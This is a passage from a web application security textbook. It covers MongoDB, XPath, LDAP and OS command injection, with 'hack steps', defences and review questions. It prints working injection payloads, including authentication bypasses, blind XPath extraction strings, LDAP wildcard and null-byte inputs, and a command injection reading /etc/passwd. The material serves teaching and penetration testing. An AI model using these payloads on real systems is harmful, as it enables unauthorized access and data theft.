case about whether to use a parameterized query. In cases where usersupplied input was clearly being used, they did so; otherwise, they didn‚Äôt 
bother. This approach has been the cause of many SQL injection fl aws. 
First, by focusing only on input that has been immediately received from 
the user, it is easy to overlook second-order attacks, because data that 
has already been processed is assumed to be trusted. Second, it is easy to 
make mistakes about the specifi c cases in which the data being handled 
is user-controllable. In a large application, different items of data are 
held within the session or received from the client. Assumptions made 
by one developer may not be communicated to others. The handling of 
specifi c data items may change in the future, introducing a SQL injection 
fl aw into previously safe queries. It is much safer to take the approach of 
mandating the use of parameterized queries throughout the application.
n Every item of data inserted into the query should be properly para meterized. 
The authors have encountered numerous cases where most of a query‚Äôs 
parameters are handled safely, but one or two items are concatenated 
directly into the string used to specify the query structure. The use of 
parameterized queries will not prevent SQL injection if some parameters 
are handled in this way.
n Parameter placeholders cannot be used to specify the table and column 
names used in the query. In some rare cases, applications need to specify 
these items within a SQL query on the basis of user-supplied data. In this 
situation, the best approach is to use a white list of known good values 
(the list of tables and columns actually used within the database) and to 
reject any input that does not match an item on this list. Failing this, strict 
validation should be enforced on the user input ‚Äî for example, allowing only alphanumeric characters, excluding whitespace, and enforcing 
a suitable length limit.
n Parameter placeholders cannot be used for any other parts of the query, 
such as the ASC or DESC keywords that appear within an ORDER BY clause, 
or any other SQL keyword, since these form part of the query structure. 
As with table and column names, if it is necessary for these items to be 
specifi ed based on user-supplied data, rigorous white list validation should 
be applied to prevent attacks.
c09.indd 341 c09.indd 341 8/19/2011 12:09:33 PM 8/19/2011 12:09:33 PM
Stuttard c09.indd V3 - 07/28/2011 Page 342
342 Chapter 9 n Attacking Data Stores
Defense in Depth
As always, a robust approach to security should employ defense-in-depth 
measures to provide additional protection in the event that frontline defenses 
fail for any reason. In the context of attacks against back-end databases, three 
layers of further defense can be employed:
n The application should use the lowest possible level of privileges when 
accessing the database. In general, the application does not need DBAlevel permissions. It usually only needs to read and write its own data. In 
security-critical situations, the application may employ a different database 
account for performing different actions. For example, if 90 percent of its 
database queries require only read access, these can be performed using 
an account that does not have write privileges. If a particular query needs 
to read only a subset of data (for example, the orders table but not the 
user accounts table), an account with the corresponding level of access 
can be used. If this approach is enforced throughout the application, any 
residual SQL injection fl aws that may exist are likely to have their impact 
signifi cantly reduced.
n Many enterprise databases include a huge amount of default functionality that can be leveraged by an attacker who gains the ability to execute 
arbitrary SQL statements. Wherever possible, unnecessary functions 
should be removed or disabled. Even though there are cases where a 
skilled and determined attacker may be able to recreate some required 
functions through other means, this task is not usually straightforward, 
and the database hardening will still place signifi cant obstacles in the 
attacker‚Äôs path.
n All vendor-issued security patches should be evaluated, tested, and applied 
in a timely way to fi x known vulnerabilities within the database software 
itself. In security-critical situations, database administrators can use various 
subscriber-based services to obtain advance notifi cation of some known 
vulnerabilities that have not yet been patched by the vendor. They can 
implement appropriate work-around measures in the interim.
Injecting into NoSQL
The term NoSQL is used to refer to various data stores that break from standard relational database architectures. NoSQL data stores represent data using 
key/value mappings and do not rely on a fi xed schema such as a conventional 
database table. Keys and values can be arbitrarily defi ned, and the format of 
the value generally is not relevant to the data store. A further feature of key/
value storage is that a value may be a data structure itself, allowing hierarchical 
storage, unlike the fl at data structure inside a database schema.
c09.indd 342 c09.indd 342 8/19/2011 12:09:33 PM 8/19/2011 12:09:33 PM
Stuttard c09.indd V3 - 07/28/2011 Page 343
 Chapter 9 n Attacking Data Stores 343
NoSQL advocates claim this has several advantages, mainly in handling very 
large data sets, where the data store‚Äôs hierarchical structure can be optimized 
exactly as required to reduce the overhead in retrieving data sets. In these 
instances a conventional database may require complex cross-referencing of 
tables to retrieve information on behalf of an application.
From a web application security perspective, the key consideration is how 
the application queries data, because this determines what forms of injection 
are possible. In the case of SQL injection, the SQL language is broadly similar 
across different database products. NoSQL, by contrast, is a name given to a 
disparate range of data stores, all with their own behaviors. They don‚Äôt all use 
a single query language.
Here are some of the common query methods used by NoSQL data stores:
n Key/value lookup
n XPath (described later in this chapter)
n Programming languages such as JavaScript
NoSQL is a relatively new technology that has evolved rapidly. It has not 
been deployed on anything like the scale of more mature technologies such as 
SQL. Hence, research into NoSQL-related vulnerabilities is still in its infancy. 
Furthermore, due to the inherently simple means by which many NoSQL implementations allow access to data, examples sometimes discussed of injecting into 
NoSQL data stores can appear contrived.
It is almost certain that exploitable vulnerabilities will arise in how NoSQL 
data stores are used in today‚Äôs and tomorrow‚Äôs web applications. One such 
example, derived from a real-world application, is described in the next section.
Injecting into MongoDB
Many NoSQL databases make use of existing programming languages to provide a fl exible, programmable query mechanism. If queries are built using 
string concatenation, an attacker can attempt to break out of the data context 
and alter the query‚Äôs syntax. Consider the following example, which performs 
a login based on user records in a MongoDB data store:
$m = new Mongo(); 
$db = $m->cmsdb;
$collection = $db->user;
$js = ‚Äúfunction() {
 return this.username == ‚Äò$username‚Äô & this.password == ‚Äò$password‚Äô; }‚Äù;
$obj = $collection->findOne(array(‚Äò$where‚Äô => $js));
if (isset($obj[‚Äúuid‚Äù]))
{
 $logged_in=1;
c09.indd 343 c09.indd 343 8/19/2011 12:09:33 PM 8/19/2011 12:09:33 PM
Stuttard c09.indd V3 - 07/28/2011 Page 344
344 Chapter 9 n Attacking Data Stores
}
else
{
 $logged_in=0;
}
$js is a JavaScript function, the code for which is constructed dynamically 
and includes the user-supplied username and password. An attacker can bypass 
the authentication logic by supplying a username:
Marcus‚Äô//
and any password. The resulting JavaScript function looks like this:
function() { return this.username == ‚ÄòMarcus‚Äô//‚Äô & this.password == ‚Äòaaa‚Äô; }
NOTE In JavaScript, a double forward slash (//) signifi es a rest-of-line comment, so the remaining code in the function is commented out.
An alternative means of ensuring that the $js function always returns 
true, without using a comment, would be to supply a username of:
a‚Äô || 1==1 || ‚Äòa‚Äô==‚Äôa
JavaScript interprets the various operators like this: 
(this.username == ‚Äòa‚Äô || 1==1) || (‚Äòa‚Äô==‚Äôa‚Äô & this.password == 
‚Äòaaa‚Äô);
This results in all of the resources in the user collection being matched, 
since the fi rst disjunctive condition is always true (1 is always equal to 1).
Injecting into XPath
The XML Path Language (XPath) is an interpreted language used to navigate 
around XML documents and to retrieve data from within them. In most cases, 
an XPath expression represents a sequence of steps that is required to navigate 
from one node of a document to another.
Where web applications store data within XML documents, they may use 
XPath to access the data in response to user-supplied input. If this input is 
inserted into the XPath query without any fi ltering or sanitization, an attacker 
may be able to manipulate the query to interfere with the application‚Äôs logic or 
retrieve data for which she is not authorized.
XML documents generally are not a preferred vehicle for storing enterprise data. 
However, they are frequently used to store application confi guration data that may 
be retrieved on the basis of user input. They may also be used by smaller applications to persist simple information such as user credentials, roles, and privileges.
c09.indd 344 c09.indd 344 8/19/2011 12:09:34 PM 8/19/2011 12:09:34 PM
Stuttard c09.indd V3 - 07/28/2011 Page 345
 Chapter 9 n Attacking Data Stores 345
Consider the following XML data store:
<addressBook>
 <address>
 <firstName>William</firstName>
 <surname>Gates</surname>
 <password>MSRocks!</password> 
 <email>billyg@microsoft.com</email>
 <ccard>5130 8190 3282 3515</ccard>
 </address>
 <address>
 <firstName>Chris</firstName>
 <surname>Dawes</surname>
 <password>secret</password>
 <email>cdawes@craftnet.de</email>
 <ccard>3981 2491 3242 3121</ccard>
 </address>
 <address>
 <firstName>James</firstName>
 <surname>Hunter</surname>
 <password>letmein</password>
 <email>james.hunter@pookmail.com</email>
 <ccard>8113 5320 8014 3313</ccard>
 </address>
</addressBook>
An XPath query to retrieve all e-mail addresses would look like this:
//address/email/text()
A query to return all the details of the user Dawes would look like this:
//address[surname/text()=‚ÄôDawes‚Äô]
In some applications, user-supplied data may be embedded directly into 
XPath queries, and the results of the query may be returned in the application‚Äôs 
response or used to determine some aspect of the application‚Äôs behavior.
Subverting Application Logic
Consider an application function that retrieves a user‚Äôs stored credit card number based on a username and password. The following XPath query effectively 
verifi es the user-supplied credentials and retrieves the relevant user‚Äôs credit 
card number:
//address[surname/text()=‚ÄôDawes‚Äô and password/text()=‚Äôsecret‚Äô]/ccard/
text()
c09.indd 345 c09.indd 345 8/19/2011 12:09:34 PM 8/19/2011 12:09:34 PM
Stuttard c09.indd V3 - 07/28/2011 Page 346
346 Chapter 9 n Attacking Data Stores
In this case, an attacker may be able to subvert the application‚Äôs query in an 
identical way to a SQL injection fl aw. For example, supplying a password with 
this value:
‚Äò or ‚Äòa‚Äô=‚Äôa
results in the following XPath query, which retrieves the credit card details of 
all users:
//address[surname/text()=‚ÄôDawes‚Äô and password/text()=‚Äô‚Äô or ‚Äòa‚Äô=‚Äôa‚Äô]/
ccard/text()
NOTE
n As with SQL injection, single quotation marks are not required when 
injecting into a numeric value.
n Unlike SQL queries, keywords in XPath queries are case-sensitive, as are 
the element names in the XML document itself.
Informed XPath Injection
XPath injection fl aws can be exploited to retrieve arbitrary information from 
within the target XML document. One reliable way of doing this uses the same 
technique as was described for SQL injection, of causing the application to 
respond in different ways, contingent on a condition specifi ed by the attacker.
Submitting the following two passwords will result in different behavior 
by the application. Results are returned in the fi rst case but not in the second:
‚Äò or 1=1 and ‚Äòa‚Äô=‚Äôa
‚Äò or 1=2 and ‚Äòa‚Äô=‚Äôa
This difference in behavior can be leveraged to test the truth of any specifi ed 
condition and, therefore, extract arbitrary information one byte at a time. As 
with SQL, the XPath language contains a substring function that can be used 
to test the value of a string one character at a time. For example, supplying this 
password:
‚Äò or //address[surname/text()=‚ÄôGates‚Äô and substring(password/text(),1,1)=
 ‚ÄòM‚Äô] and ‚Äòa‚Äô=‚Äôa
results in the following XPath query, which returns results if the fi rst character 
of the Gates user‚Äôs password is M:
//address[surname/text()=‚ÄôDawes‚Äô and password/text()=‚Äô‚Äô or
//address[surname/text()=‚ÄôGates‚Äô and substring(password/text(),1,1)= ‚ÄòM‚Äô]
and ‚Äòa‚Äô=‚Äôa ‚Äò]/ccard/text()
c09.indd 346 c09.indd 346 8/19/2011 12:09:34 PM 8/19/2011 12:09:34 PM
Stuttard c09.indd V3 - 07/28/2011 Page 347
 Chapter 9 n Attacking Data Stores 347
By cycling through each character position and testing each possible value, 
an attacker can extract the full value of Gates‚Äô password.
TRY IT!
http://mdsec.net/cclookup/14/
Blind XPath Injection
In the attack just described, the injected test condition specifi ed both the absolute 
path to the extracted data (address) and the names of the targeted fi elds (surname
and password). In fact, it is possible to mount a fully blind attack without possessing this information. XPath queries can contain steps that are relative to the 
current node within the XML document, so from the current node it is possible 
to navigate to the parent node or to a specifi c child node. Furthermore, XPath 
contains functions to query meta-information about the document, including 
the name of a specifi c element. Using these techniques, it is possible to extract 
the names and values of all nodes within the document without knowing any 
prior information about its structure or contents.
For example, you can use the substring technique described previously to 
extract the name of the current node‚Äôs parent by supplying a series of passwords 
of this form:
‚Äò or substring(name(parent::*[position()=1]),1,1)= ‚Äòa
This input generates results, because the fi rst letter of the address node is a.
Moving on to the second letter, you can confi rm that this is d by supplying the 
following passwords, the last of which generates results:
‚Äò or substring(name(parent::*[position()=1]),2,1)=‚Äôa
‚Äò or substring(name(parent::*[position()=1]),2,1)=‚Äôb
‚Äò or substring(name(parent::*[position()=1]),2,1)=‚Äôc
‚Äò or substring(name(parent::*[position()=1]),2,1)=‚Äôd
Having established the name of the address node, you can then cycle through 
each of its child nodes, extracting all their names and values. Specifying the 
relevant child node by index avoids the need to know the names of any nodes. 
For example, the following query returns the value Hunter:
//address[position()=3]/child::node()[position()=4]/text()
And the following query returns the value letmein:
//address[position()=3]/child::node()[position()=6]/text()
c09.indd 347 c09.indd 347 8/19/2011 12:09:34 PM 8/19/2011 12:09:34 PM
Stuttard c09.indd V3 - 07/28/2011 Page 348
348 Chapter 9 n Attacking Data Stores
This technique can be used in a completely blind attack, where no results are 
returned within the application‚Äôs responses, by crafting an injected condition 
that specifi es the target node by index. For example, supplying the following 
password returns results if the fi rst character of Gates‚Äô password is M:
‚Äò or substring(//address[position()=1]/child::node()[position()=6]/
text(),1,1)= ‚ÄòM‚Äô and ‚Äòa‚Äô=‚Äôa
By cycling through every child node of every address node, and extracting 
their values one character at a time, you can extract the entire contents of the 
XML data store.
TIP XPath contains two useful functions that can help you automate the 
preceding attack and quickly iterate through all nodes and data in the XML 
document:
n count() returns the number of child nodes of a given element, which 
can be used to determine the range of position() values to iterate 
over.
n string-length() returns the length of a supplied string, which can be 
used to determine the range of substring() values to iterate over. 
TRY IT!
http://mdsec.net/cclookup/19/
Finding XPath Injection Flaws
Many of the attack strings that are commonly used to probe for SQL injection 
fl aws typically result in anomalous behavior when submitted to a function that 
is vulnerable to XPath injection. For example, either of the following two strings 
usually invalidates the XPath query syntax and generates an error:
‚Äò
‚Äò--
One or more of the following strings typically result in some change in the 
application‚Äôs behavior without causing an error, in the same way as they do in 
relation to SQL injection fl aws:
‚Äò or ‚Äòa‚Äô=‚Äôa
‚Äò and ‚Äòa‚Äô=‚Äôb
 or 1=1
 and 1=2
c09.indd 348 c09.indd 348 8/19/2011 12:09:34 PM 8/19/2011 12:09:34 PM
Stuttard c09.indd V3 - 07/28/2011 Page 349
 Chapter 9 n Attacking Data Stores 349
Hence, in any situation where your tests for SQL injection provide tentative 
evidence for a vulnerability, but you are unable to conclusively exploit the fl aw, 
you should investigate the possibility that you are dealing with an XPath injection fl aw.
HACK STEPS
 1. Try submitting the following values, and determine whether these result 
in different application behavior, without causing an error:
‚Äò or count(parent::*[position()=1])=0 or ‚Äòa‚Äô=‚Äôb
‚Äò or count(parent::*[position()=1])>0 or ‚Äòa‚Äô=‚Äôb
If the parameter is numeric, also try the following test strings:
1 or count(parent::*[position()=1])=0
1 or count(parent::*[position()=1])>0
 2. If any of the preceding strings causes differential behavior within the 
application without causing an error, it is likely that you can extract arbitrary data by crafting test conditions to extract one byte of information at 
a time. Use a series of conditions with the following form to determine 
the name of the current node‚Äôs parent:
substring(name(parent::*[position()=1]),1,1)=‚Äôa‚Äô
 3. Having extracted the name of the parent node, use a series of conditions 
with the following form to extract all the data within the XML tree:
substring(//parentnodename[position()=1]/child::node()
[position()=1]/text(),1,1)=‚Äôa‚Äô
Preventing XPath Injection
If you think it is necessary to insert user-supplied input into an XPath query, 
this operation should only be performed on simple items of data that can be 
subjected to strict input validation. The user input should be checked against 
a white list of acceptable characters, which should ideally include only alphanumeric characters. Characters that may be used to interfere with the XPath 
query should be blocked, including ( ) = ‚Äò [ ] : , * / and all whitespace. 
Any input that does not match the white list should be rejected, not sanitized.
Injecting into LDAP
The Lightweight Directory Access Protocol (LDAP) is used to access directory 
services over a network. A directory is a hierarchically organized data store that 
may contain any kind of information but is commonly used to store personal 
data such as names, telephone numbers, e-mail addresses, and job functions. 
c09.indd 349 c09.indd 349 8/19/2011 12:09:34 PM 8/19/2011 12:09:34 PM
Stuttard c09.indd V3 - 07/28/2011 Page 350
350 Chapter 9 n Attacking Data Stores
Common examples of LDAP are the Active Directory used within Windows 
domains, and OpenLDAP, used in various situations. You are most likely to 
encounter LDAP being used in corporate intranet-based web applications, such 
as an HR application that allows users to view and modify information about 
employees.
Each LDAP query uses one or more search fi lters, which determine the directory entries that are returned by the query. Search fi lters can use various logical 
operators to represent complex search conditions. The most common search 
fi lters you are likely to encounter are as follows:
n Simple match conditions match on the value of a single attribute. For 
example, an application function that searches for a user via his username 
might use this fi lter:
(username=daf)
n Disjunctive queries specify multiple conditions, any one of which must 
be satisfi ed by entries that are returned. For example, a search function 
that looks up a user-supplied search term in several directory attributes 
might use this fi lter:
(|(cn=searchterm)(sn=searchterm)(ou=searchterm))
n Conjunctive queries specify multiple conditions, all of which must be 
satisfi ed by entries that are returned. For example, a login mechanism 
implemented in LDAP might use this fi lter:
(&(username=daf)(password=secret)
As with other forms of injection, if user-supplied input is inserted into an 
LDAP search fi lter without any validation, it may be possible for an attacker 
to supply crafted input that modifi es the fi lter‚Äôs structure and thereby retrieve 
data or perform actions in an unauthorized way.
In general, LDAP injection vulnerabilities are not as readily exploitable as 
SQL injection fl aws, due to the following factors:
n Where the search fi lter employs a logical operator to specify a conjunctive 
or disjunctive query, this usually appears before the point where usersupplied data is inserted and therefore cannot be modifi ed. Hence, simple 
match conditions and conjunctive queries don‚Äôt have an equivalent to the 
‚Äúor 1=1‚Äù type of attack that arises with SQL injection.
n In the LDAP implementations that are in common use, the directory attributes to be returned are passed to the LDAP APIs as a separate parameter 
from the search fi lter and normally are hard-coded within the application. 
c09.indd 350 c09.indd 350 8/19/2011 12:09:34 PM 8/19/2011 12:09:34 PM
Stuttard c09.indd V3 - 07/28/2011 Page 351
 Chapter 9 n Attacking Data Stores 351
Hence, it usually is not possible to manipulate user-supplied input to 
retrieve different attributes than the query was intended to retrieve.
n Applications rarely return informative error messages, so vulnerabilities 
generally need to be exploited ‚Äúblind.‚Äù
Exploiting LDAP Injection
Despite the limitations just described, in many real-world situations it is possible 
to exploit LDAP injection vulnerabilities to retrieve unauthorized data from the 
application or to perform unauthorized actions. The details of how this is done typically are highly dependent on the construction of the search fi lter, the entry point 
for user input, and the implementation details of the back-end LDAP service itself.
Disjunctive Queries
Consider an application that lets users list employees within a specifi ed department of the business. The search results are restricted to the geographic locations 
that the user is authorized to view. For example, if a user is authorized to view 
the London and Reading locations, and he searches for the ‚Äúsales‚Äù department, 
the application performs the following disjunctive query:
(|(department=London sales)(department=Reading sales))
Here, the application constructs a disjunctive query and prepends different 
expressions before the user-supplied input to enforce the required access control.
In this situation, an attacker can subvert the query to return details of all 
employees in all locations by submitting the following search term:
)(department=*
The * character is a wildcard in LDAP; it matches any item. When this input 
is embedded into the LDAP search fi lter, the following query is performed:
(|(department=London )(department=*)(department=Reading )(department=*))
Since this is a disjunctive query and contains the wildcard term (department=*), it matches on all directory entries. It returns the details of all employees 
from all locations, thereby subverting the application‚Äôs access control.
TRY IT!
http://mdsec.net/employees/31/
http://mdsec.net/employees/49/
c09.indd 351 c09.indd 351 8/19/2011 12:09:34 PM 8/19/2011 12:09:34 PM
Stuttard c09.indd V3 - 07/28/2011 Page 352
352 Chapter 9 n Attacking Data Stores
Conjunctive Queries
Consider a similar application function that allows users to search for employees by name, again within the geographic region they are authorized to view.
If a user is authorized to search within the London location, and he searches 
for the name daf, the following query is performed:
(&(givenName=daf)(department=London*))
Here, the user‚Äôs input is inserted into a conjunctive query, the second part of 
which enforces the required access control by matching items in only one of 
the London departments. 
In this situation, two different attacks might succeed, depending on the 
details of the back-end LDAP service. Some LDAP implementations, including 
OpenLDAP, allow multiple search fi lters to be batched, and these are applied 
disjunctively. (In other words, directory entries are returned that match any of 
the batched fi lters.) For example, an attacker could supply the following input:
*))(&(givenName=daf
When this input is embedded into the original search fi lter, it becomes:
(&(givenName=*))(&(givenName=daf)(department=London*))
This now contains two search fi lters, the fi rst of which contains a single 
wildcard match condition. The details of all employees are returned from all 
locations, thereby subverting the application‚Äôs access control.
TRY IT!
http://mdsec.net/employees/42/
NOTE This technique of injecting a second search fi lter is also effective 
against simple match conditions that do not employ any logical operator, provided that the back-end implementation accepts multiple search fi lters.
The second type of attack against conjunctive queries exploits how many LDAP 
implementations handle NULL bytes. Because these implementations typically are 
written in native code, a NULL byte within a search fi lter effectively terminates the 
string, and any characters coming after the NULL are ignored. Although LDAP 
does not itself support comments (in the way that the -- sequence can be used 
in SQL), this handling of NULL bytes can effectively be exploited to ‚Äúcomment 
out‚Äù the remainder of the query.
c09.indd 352 c09.indd 352 8/19/2011 12:09:34 PM 8/19/2011 12:09:34 PM
Stuttard c09.indd V3 - 07/28/2011 Page 353
 Chapter 9 n Attacking Data Stores 353
In the preceding example, the attacker can supply the following input:
*))%00
The %00 sequence is decoded by the application server into a literal NULL byte, 
so when the input is embedded into the search fi lter, it becomes:
(&(givenName=*))[NULL])(department=London*))
Because this fi lter is truncated at the NULL byte, as far as LDAP is concerned it 
contains only a single wildcard condition, so the details of all employees from 
departments outside the London area are also returned.
TRY IT!
http://mdsec.net/employees/13/
http://mdsec.net/employees/42/
Finding LDAP Injection Flaws
Supplying invalid input to an LDAP operation typically does not result in an 
informative error message. In general, the evidence available to you in diagnosing 
vulnerability includes the results returned by a search function and the occurrence of an error such as an HTTP 500 status code. Nevertheless, you can use the 
following steps to identify an LDAP injection fl aw with a degree of reliability.
HACK STEPS
 1. Try entering just the * character as a search term. This character functions 
as a wildcard in LDAP, but not in SQL. If a large number of results are 
returned, this is a good indicator that you are dealing with an LDAP query.
 2. Try entering a number of closing brackets:
))))))))))
This input closes any brackets enclosing your input, as well as those 
that encapsulate the main search filter itself. This results in unmatched 
closing brackets, thus invalidating the query syntax. If an error results, the 
application may be vulnerable to LDAP injection. (Note that this input may 
also break many other kinds of application logic, so this provides a strong 
indicator only if you are already confident that you are dealing with an 
LDAP query.)
Continued
c09.indd 353 c09.indd 353 8/19/2011 12:09:34 PM 8/19/2011 12:09:34 PM
Stuttard c09.indd V3 - 07/28/2011 Page 354
354 Chapter 9 n Attacking Data Stores
 3. Try entering various expressions designed to interfere with different 
types of queries, and see if these allow you to influence the results being 
returned. The cn attribute is supported by all LDAP implementations and 
is useful to use if you do not know any details about the directory you are 
querying. For example:
)(cn=*
*))(|(cn=*
*))%00
Preventing LDAP Injection
If it is necessary to insert user-supplied input into an LDAP query, this operation should be performed only on simple items of data that can be subjected to 
strict input validation. The user input should be checked against a white list of 
acceptable characters, which should ideally include only alphanumeric characters. Characters that may be used to interfere with the LDAP query should 
be blocked, including ( ) ; , * | & = and the null byte. Any input that does 
not match the white list should be rejected, not sanitized.
Summary
We have examined a range of vulnerabilities that allow you to inject into web 
application data stores. These vulnerabilities may allow you to read or modify 
sensitive application data, perform other unauthorized actions, or subvert application logic to achieve an objective.
As serious as these attacks are, they are only part of a wider range of attacks 
that involve injecting into interpreted contexts. Other attacks in this category 
may allow you to execute commands on the server‚Äôs operating system, retrieve 
arbitrary fi les, and interfere with other back-end components. The next chapter 
examines these attacks and others. It looks at how vulnerabilities within a web 
application can lead to compromise of key parts of the wider infrastructure that 
supports the application.
Questions
Answers can be found at http://mdsec.net/wahh.
 1. You are trying to exploit a SQL injection fl aw by performing a UNION attack 
to retrieve data. You do not know how many columns the original query 
returns. How can you fi nd this out?
HACK STEPS (CONTINUED)
c09.indd 354 c09.indd 354 8/19/2011 12:09:34 PM 8/19/2011 12:09:34 PM
Stuttard c09.indd V3 - 07/28/2011 Page 355
 Chapter 9 n Attacking Data Stores 355
 2. You have located a SQL injection vulnerability in a string parameter. You 
believe the database is either MS-SQL or Oracle, but you can‚Äôt retrieve 
any data or an error message to confi rm which database is running. How 
can you fi nd this out?
 3. You have submitted a single quotation mark at numerous locations throughout the application. From the resulting error messages you have diagnosed 
several potential SQL injection fl aws. Which one of the following would 
be the safest location to test whether more crafted input has an effect on 
the application‚Äôs processing?
 (a) Registering a new user
 (b) Updating your personal details
 (c) Unsubscribing from the service
 4. You have found a SQL injection vulnerability in a login function, and 
you try to use the input ‚Äò or 1=1-- to bypass the login. Your attack fails, 
and the resulting error message indicates that the -- characters are being 
stripped by the application‚Äôs input fi lters. How could you circumvent this 
problem?
 5. You have found a SQL injection vulnerability but have been unable to 
carry out any useful attacks, because the application rejects any input 
containing whitespace. How can you work around this restriction?
 6. The application is doubling up all single quotation marks within user 
input before these are incorporated into SQL queries. You have found a 
SQL injection vulnerability in a numeric fi eld, but you need to use a string 
value in one of your attack payloads. How can you place a string in your 
query without using any quotation marks?
 7. In some rare situations, applications construct dynamic SQL queries from 
user-supplied input in a way that cannot be made safe using parameterized queries. When does this occur?
 8. You have escalated privileges within an application such that you now 
have full administrative access. You discover a SQL injection vulnerability 
within a user administration function. How can you leverage this vulnerability to further advance your attack?
 9. You are attacking an application that holds no sensitive data and contains 
no authentication or access control mechanisms. In this situation, how 
should you rank the signifi cance of the following vulnerabilities?
 (a) SQL injection
 (b) XPath injection
 (c) OS command injection
c09.indd 355 c09.indd 355 8/19/2011 12:09:34 PM 8/19/2011 12:09:34 PM
Stuttard c09.indd V3 - 07/28/2011 Page 356
356 Chapter 9 n Attacking Data Stores
 10. You are probing an application function that enables you to search personnel details. You suspect that the function is accessing either a database or 
an Active Directory back end. How could you try to determine which of 
these is the case?
c09.indd 356 c09.indd 356 8/19/2011 12:09:34 PM 8/19/2011 12:09:34 PM
Stuttard c10.indd V2 - 07/05/2011 Page 357
357
C H A P T E R 
10
Attacking Back-End 
Components
Web applications are increasingly complex offerings. They frequently function 
as the Internet-facing interface to a variety of business-critical resources on the 
back end, including networked resources such as web services, back-end web 
servers, mail servers, and local resources such as fi lesystems and interfaces to the 
operating system. Frequently, the application server also acts as a discretionary 
access control layer for these back-end components. Any successful attack that 
could perform arbitrary interaction with a back-end component could potentially 
violate the entire access control model applied by the web application, allowing 
unauthorized access to sensitive data and functionality.
When data is passed from one component to another, it is interpreted by 
different sets of APIs and interfaces. Data that is considered ‚Äúsafe‚Äù by the core 
application may be extremely unsafe within the onward component, which 
may support different encodings, escape characters, fi eld delimiters, or string 
terminators. Additionally, the onward component may possess considerably 
more functionality than what the application normally invokes. An attacker 
exploiting an injection vulnerability can often go beyond merely breaking the 
application‚Äôs access control. She can exploit the additional functionality supported by the back-end component to compromise key parts of the organization‚Äôs infrastructure.
c10.indd 357 c10.indd 357 8/19/2011 12:10:45 PM 8/19/2011 12:10:45 PM
Stuttard c10.indd V2 - 07/05/2011 Page 358
358 Chapter 10 n Attacking Back-End Components
Injecting OS Commands
Most web server platforms have evolved to the point where built-in APIs exist 
to perform practically any required interaction with the server‚Äôs operating 
system. Properly used, these APIs can enable developers to access the fi lesystem, interface with other processes, and carry out network communications in 
a safe manner. Nevertheless, there are many situations in which developers 
elect to use the more heavyweight technique of issuing operating system commands directly to the server. This option can be attractive because of its power 
and simplicity and often provides an immediate and functional solution to 
a particular problem. However, if the application passes user-supplied input 
to operating system commands, it may be vulnerable to command injection, 
enabling an attacker to submit crafted input that modifi es the commands that 
the developers intended to perform.
The functions commonly used to issue operating system commands, such 
as exec in PHP and wscript.shell in ASP, do not impose any restrictions on 
the scope of commands that may be performed. Even if a developer intends 
to use an API to perform a relatively benign task such as listing a directory‚Äôs 
contents, an attacker may be able to subvert it to write arbitrary fi les or launch 
other programs. Any injected commands usually run in the security context 
of the web server process, which often is suffi ciently powerful for an attacker 
to compromise the entire server.
Command injection fl aws of this kind have arisen in numerous off-the-shelf 
and custom-built web applications. They have been particularly prevalent within 
applications that provide an administrative interface to an enterprise server or 
to devices such as fi rewalls, printers, and routers. These applications often have 
particular requirements for operating system interaction that lead developers 
to use direct commands that incorporate user-supplied data.
Example 1: Injecting Via Perl
Consider the following Perl CGI code, which is part of a web application for 
server administration. This function allows administrators to specify a directory on the server and view a summary of its disk usage:
#!/usr/bin/perl
use strict;
use CGI qw(:standard escapeHTML);
print header, start_html(‚Äú‚Äù);
print ‚Äú<pre>‚Äù;
my $command = ‚Äúdu -h --exclude php* /var/www/html‚Äù;
$command= $command.param(‚Äúdir‚Äù);
$command=`$command`;
c10.indd 358 c10.indd 358 8/19/2011 12:10:45 PM 8/19/2011 12:10:45 PM
Stuttard c10.indd V2 - 07/05/2011 Page 359
 Chapter 10 n Attacking Back-End Components 359
print ‚Äú$command\n‚Äù;
print end_html;
When used as intended, this script simply appends the value of the usersupplied dir parameter to the end of a preset command, executes the command, 
and displays the results, as shown in Figure 10-1.
Figure 10-1: A simple application function for listing a directory‚Äôs contents
This functionality can be exploited in various ways by supplying crafted input 
containing shell metacharacters. These characters have a special meaning to 
the interpreter that processes the command and can be used to interfere with 
the command that the developer intended to execute. For example, the pipe 
character (|) is used to redirect the output from one process into the input of 
another, enabling multiple commands to be chained together. An attacker can 
leverage this behavior to inject a second command and retrieve its output, as 
shown in Figure 10-2.
Here, the output from the original du command has been redirected as the 
input to the command cat/etc/passwd. This command simply ignores the 
input and performs its sole task of outputting the contents of the passwd fi le.
An attack as simple as this may appear improbable; however, exactly this type 
of command injection has been found in numerous commercial products. For 
example, HP OpenView was found to be vulnerable to a command injection 
fl aw within the following URL:
https://target:3443/OvCgi/connectedNodes.ovpl?node=a| [your command] |
c10.indd 359 c10.indd 359 8/19/2011 12:10:45 PM 8/19/2011 12:10:45 PM
Stuttard c10.indd V2 - 07/05/2011 Page 360
360 Chapter 10 n Attacking Back-End Components
Figure 10-2: A successful command injection attack
Example 2: Injecting Via ASP
Consider the following C# code, which is part of a web application for administering a web server. The function allows administrators to view the contents 
of a requested directory:
string dirName = ‚ÄúC:\\filestore\\‚Äù + Directory.Text;
ProcessStartInfo psInfo = new ProcessStartInfo(‚Äúcmd‚Äù, ‚Äú/c dir ‚Äú + 
dirName);
...
Process proc = Process.Start(psInfo);
When used as intended, this script inserts the value of the user-supplied 
Directory parameter into a preset command, executes the command, and 
displays the results, as shown in Figure 10-3.
As with the vulnerable Perl script, an attacker can use shell metacharacters to 
interfere with the preset command intended by the developer and inject his own 
command. The ampersand character (&) is used to batch multiple commands. 
Supplying a fi lename containing the ampersand character and a second command causes this command to be executed and its results displayed, as shown 
in Figure 10-4.
c10.indd 360 c10.indd 360 8/19/2011 12:10:46 PM 8/19/2011 12:10:46 PM
Stuttard c10.indd V2 - 07/05/2011 Page 361
 Chapter 10 n Attacking Back-End Components 361
Figure 10-3: A function to list the contents of a directory
Figure 10-4: A successful command injection attack
c10.indd 361 c10.indd 361 8/19/2011 12:10:46 PM 8/19/2011 12:10:46 PM
Stuttard c10.indd V2 - 07/05/2011 Page 362
362 Chapter 10 n Attacking Back-End Components
TRY IT!
http://mdsec.net/admin/5/
http://mdsec.net/admin/9/
http://mdsec.net/admin/14/
Injecting Through Dynamic Execution
Many web scripting languages support the dynamic execution of code that is 
generated at runtime. This feature enables developers to create applications that 
dynamically modify their own code in response to various data and conditions. 
If user input is incorporated into code that is dynamically executed, an attacker 
may be able to supply crafted input that breaks out of the intended data context 
and specifi es commands that are executed on the server in the same way as if 
